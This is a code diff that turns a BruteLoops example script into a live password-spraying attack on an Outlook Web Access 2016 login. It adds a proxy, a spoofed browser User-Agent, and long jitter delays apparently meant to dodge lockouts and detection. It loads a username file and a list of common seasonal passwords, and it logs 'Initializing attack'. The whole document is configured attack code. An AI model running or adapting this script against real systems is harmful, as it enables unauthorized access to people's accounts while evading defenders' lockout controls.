@@ -1,7 +1,10 @@
+#!/usr/bin/env python3
+
 from BruteLoops.jitter import Jitter
 from BruteLoops.brute import Horizontal
 from BruteLoops.config import Config
 from BruteLoops.logging import GENERAL_EVENTS,logging
+from ***REMOVED*** import OWA2016
 
 # ========================
 # USER INTERFACE SHORTCUTS
@@ -49,41 +52,38 @@ def fake(username, password, *args, **kwargs):
         return [0,username,password]
 
 config = Config()
-config.authentication_callback = fake   # Function/object/callbale used to determine of credentials are valid
-                                        # Will receive arguments as: config.authenticaiton_callback(usernam,password)
-                                        #
-                                        # Expected to return: (authentication_outcome,username,password)
-                                        # authentication_outcome should be an integer value, where anything greater
-                                        # than 0 indicates successful authentication
+proxies = {'https':'http://***REMOVED***:31280'}
+headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'}
+config.authentication_callback = OWA2016('***REMOVED***
+        proxies=proxies,
+        headers=headers)
+                                     
 # ============================
 # AUTHENTICATION CONFIGURATION
 # ============================
-config.process_count = 8            # Use 8 processes for authentication
-config.max_auth_tries = 3           # Allow up to three simultaneous authentication attempts per user
-#config.stop_on_valid = True        # Uncomment this to halt authentication after recover of a single account
+config.process_count = 8      
+config.max_auth_tries = 1    
+config.stop_on_valid = True 
 
 # ====================
 # JITTER CONFIGURATION
 # ====================
-config.authentication_jitter = Jitter(min='2s',max='3s') # Sleep for a small window of time between auth attempts
-config.max_auth_jitter = Jitter(min='10s',max='15s')     # Sleep for an extended period of times after max_auth_tries
+config.authentication_jitter = Jitter(min='20s',max='25s') 
+config.max_auth_jitter = Jitter(min='45m',max='50m')     
 
 # ====================
 # OUTPUT CONFIGURATION
 # ====================
-
-config.db_file = 'testdb.sqlite'    # REQUIRED: Database to write usernames/passwords
-
-# NOTE: Logging is entirely optional!
+config.db_file = '***REMOVED***'    
 
 # LOGGING LEVELS
-config.log_valid = True             # Log authentication records that appear to be valid
-#config.log_invalid = True          # Log invalid authentication attempts (verbose)
-config.log_general = True           # Log general events (even more verbose)
+config.log_valid = True             
+config.log_invalid = True          
+config.log_general = True         
 
 # LOG DESTINATIONS
-config.log_stdout = True            # Log to stdout
-config.log_file = 'testlog.txt'     # Log to a file
+config.log_stdout = True         
+config.log_file = '***REMOVED***.txt'
 
 # ===============================
 # EXCEPTION HANDLER CONFIGURATION
@@ -104,8 +104,9 @@ try:
     logger.log(GENERAL_EVENTS,'Initializing attack')
     bf = Horizontal(config)
     bf.launch(
-        usernames=['admin','administrator','superadmin','newuser','administrator'],
-        passwords=['P@ssw0rd','password','Password1','W1nter2019']
+        usernames='fl_ln.final',
+        passwords=['Password1','Password#1','Password1!','Password123',
+            'Spring2019!','Summer2019!','Winter2018!','***REMOVED***','***REMOVED***']
     )
     logger.log(GENERAL_EVENTS,'Attack complete')
     
